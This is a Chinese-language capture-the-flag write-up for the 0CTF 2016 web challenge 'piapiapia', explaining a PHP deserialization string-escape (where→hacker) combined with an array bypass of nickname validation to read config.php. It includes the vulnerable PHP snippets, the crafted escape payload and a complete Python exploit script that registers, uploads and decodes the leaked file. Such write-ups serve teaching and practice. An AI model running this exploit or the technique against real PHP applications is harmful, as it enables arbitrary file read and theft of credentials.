---
title: 0CTF 2016 - Web - piapiapia
date: 2026-11-14 18:00:00
categories:
  - CTF
  - 0CTF 2016
  - Web
tags:
  - PHP反序列化
  - 字符串逃逸
  - 数组绕过
  - 任意文件读取
cover: /img/cover/anime-characters-collage.jpg
description: PHP 代码审计题，经 www.zip 源码泄漏定位 filter() 中 where 替换为 hacker 造成的反序列化长度逃逸，配合 nickname 数组绕过校验，把 photo 注入为 config.php 读 flag。
keywords:
  - PHP反序列化
  - 字符串逃逸
  - 数组绕过
  - 源码泄漏
  - 0CTF
ai: >-
  0CTF 2016 的 Web 审计题，www.zip 泄漏源码。class.php 的 filter() 把 where 换为 hacker，长度由五变六导致序列化逃逸；update.php 对 nickname 的 preg_match 与 strlen 校验可用数组绕过，注入结构字符。构造 35 个 where 加闭合 payload，使 photo 改为 config.php，profile.php 反序列化后执行 file_get_contents 并 base64 回显，读到源码中的 flag。考点为反序列化字符串逃逸与数组绕过。
copyright_author: Hunter
---

> 结论先行：源码泄漏 + `filter()` 中 `where`→`hacker` 长度 +1 引发反序列化字符串逃逸；用 `nickname[]` 数组绕过正则与长度校验，把 `photo` 注入为 `config.php`，借 `file_get_contents` 读源码拿 flag。

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 0CTF 2016 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

## 信息收集

访问 `www.zip` 下载源码，得到 `config.php`、`index.php`、`register.php`、`update.php`、`profile.php`、`class.php`。

漏洞清单：
- 源码泄漏（`www.zip`）
- PHP 反序列化字符串逃逸（`filter()` 的 `where`→`hacker` 长度 +1）
- `preg_match`/`strlen` 数组绕过
- 任意文件读取（`file_get_contents($profile['photo'])`）

## 漏洞分析

### class.php 的 filter()（核心）

```php
public function filter($string) {
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);          // ' 和 \ -> _
    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);          // 关键字 -> hacker
}
```

- `where`（5 字符）→ `hacker`（6 字符），长度 **+1**。
- `select/insert/update/delete`（6 字符）→ `hacker`（6 字符），长度不变。

### update.php 的校验

```php
if(!preg_match('/^\d{11}$/', $_POST['phone'])) die('Invalid phone');
if(!preg_match('/^[_a-zA-Z0-9]{1,10}@...$/', $_POST['email'])) die('Invalid email');
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
    die('Invalid nickname');
...
$profile['photo'] = 'upload/' . md5($file['name']);
$user->update_profile($username, serialize($profile));   // 序列化后经 filter 存入 DB
```

### profile.php 的反序列化

```php
$profile = unserialize($profile);
$photo = base64_encode(file_get_contents($profile['photo']));  // 读任意文件
```

### 1. 数组绕过 nickname 校验

`preg_match('/[^a-zA-Z0-9_]/', $array)` 对数组返回 `false`，`strlen($array)` 对数组也无效，因此 `die('Invalid nickname')` 不会触发。用 `nickname[]=<value>` 传数组即可注入任意长度、任意字符（包括 `"` `;` `}` 等）。

### 2. 字符串逃逸

序列化时 `$profile['nickname']` 是数组，序列化后形如：

```text
...s:8:"nickname";a:1:{i:0;s:N:"<内容>";}s:5:"photo";s:39:"upload/<32hex>";}
```

`filter()` 把 `where`→`hacker`（+1），但序列化里声明的长度 `s:N` 不变，导致每个 `where` 让实际值比声明多 1 字符，累计逃逸。

## 利用过程

### 构造 payload

```python
payload = '";}s:5:"photo";s:10:"config.php";}"'
nickname = 'where' * len(payload) + payload
```

- `len(payload)` = 35，35 个 `where` 经 filter 变 35 个 `hacker`，总长 +35。
- 逃逸出的 35 字符正好把注入的 `payload` 推出去，闭合 nickname 数组，注入新的 `photo = config.php`。

最终反序列化后 `$profile['photo'] = 'config.php'`，`file_get_contents` 读其源码，`base64_encode` 输出。

### 读取 flag

`config.php` 源码：

```php
<?php
$config['hostname'] = '127.0.0.1';
$config['username'] = 'root';
$config['password'] = 'qwertyuiop';
$config['database'] = 'challenges';
$flag = 'flag{xxxx}';
?>
```

## 完整 EXP

```python
import urllib.request, urllib.parse, sys, re, http.cookiejar, uuid, random, base64

HOST = 'http://target:8080'  # 授权靶场（已脱敏）

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def post(path, data):
    req = urllib.request.Request(HOST + path, method='POST',
        data=urllib.parse.urlencode(data).encode(), headers={'User-Agent':'Mozilla/5.0'})
    r = opener.open(req, timeout=20); return r.read().decode('utf-8','ignore')

def get(path):
    req = urllib.request.Request(HOST + path, headers={'User-Agent':'Mozilla/5.0'})
    r = opener.open(req, timeout=20); return r.read().decode('utf-8','ignore')

def mp_nickname_array(phone, email, nickname_value, fname, fcontent):
    b = uuid.uuid4().hex
    parts = []
    parts.append(f'--{b}\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n')
    parts.append(f'--{b}\r\nContent-Disposition: form-data; name="email"\r\n\r\n{email}\r\n')
    parts.append(f'--{b}\r\nContent-Disposition: form-data; name="nickname[]"\r\n\r\n{nickname_value}\r\n')
    parts.append(f'--{b}\r\nContent-Disposition: form-data; name="photo"; filename="{fname}"\r\nContent-Type: image/gif\r\n\r\n')
    body = ''.join(parts).encode() + fcontent + f'\r\n--{b}--\r\n'.encode()
    req = urllib.request.Request(HOST + '/update.php', method='POST', data=body,
        headers={'User-Agent':'Mozilla/5.0','Content-Type':f'multipart/form-data; boundary={b}'})
    r = opener.open(req, timeout=20); return r.read().decode('utf-8','ignore')

u = 't' + str(random.randint(100000,999999)); p = 'pass123'
post('/register.php', {'username':u,'password':p})
post('/index.php', {'username':u,'password':p})

gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'

# 字符串逃逸 payload
payload = '";}s:5:"photo";s:10:"config.php";}"'
nickname_value = 'where' * len(payload) + payload

mp_nickname_array('13333333333', '123@qq.com', nickname_value, 'a.gif', gif)
body = get('/profile.php')
m = re.search(r'base64,([^"]*)"', body)
if m:
    print(base64.b64decode(m.group(1)).decode('utf-8','replace'))
```

## Flag

```text
flag{xxxx}
```

## 踩坑与总结

1. 源码泄漏找漏洞点。
2. `where`→`hacker` 长度 +1 造成反序列化字符串逃逸。
3. `nickname[]` 数组绕过 `preg_match`/`strlen` 校验，注入恶意结构字符。
4. 逃逸注入 `photo=config.php`，任意文件读取拿 flag。
5. 序列化里声明的 `s:N` 长度不会因 filter 改变，这是逃逸能成立的根本原因；构造时 `where` 的个数必须等于注入 payload 的长度。
